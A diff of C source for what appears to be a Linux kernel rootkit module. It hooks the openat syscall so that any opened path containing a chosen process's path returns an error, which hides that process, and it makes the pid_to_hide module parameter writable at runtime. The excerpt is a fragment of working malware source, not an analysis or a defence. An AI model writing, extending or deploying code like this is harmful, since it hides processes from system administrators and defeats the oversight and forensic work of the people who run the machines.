@@ -13,7 +13,7 @@ void initialize_path_to_hide(void);
 
 // Types & other consts.
 static char *pid_to_hide = NULL;
-module_param(pid_to_hide, charp, 0);
+module_param(pid_to_hide, charp, 0600);
 
 typedef int (*original_openat_t)(const struct pt_regs *regs);
 static original_openat_t original_openat_ptr;
@@ -39,6 +39,10 @@ int new_openat(const struct pt_regs *regs) {
     char *path;
     path = kmalloc(PATH_MAX, GFP_KERNEL);
     copy_from_user((void*)path, path_name_pointer, PATH_MAX);
+
+    // Incase pid to hide has been changed.
+    initialize_path_to_hide();
+
 
     // If the target is contained within/is the path we're trying to hide, return an error.
     if (strstr(path, path_to_hide) != NULL) {
